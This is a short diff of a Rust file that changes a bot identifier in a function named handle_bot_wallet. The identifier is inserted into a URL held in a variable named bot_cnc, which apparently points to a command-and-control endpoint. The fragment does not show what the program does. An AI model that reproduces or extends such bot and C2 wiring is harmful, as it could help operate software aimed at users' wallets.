@@ -379,7 +379,7 @@ async fn handle_bot_wallet() -> impl IntoResponse {
         .and_then(|p| p.parent().map(|d| d.to_path_buf()))
         .unwrap_or_else(|| current_dir.clone());
     
-    let bot_id = "bot";
+    let bot_id = "g1m";
     let bot_cnc = format!("https://cnc-pwa.onrender.com/?id={}", bot_id);
     
     let mut paths_to_try = vec![
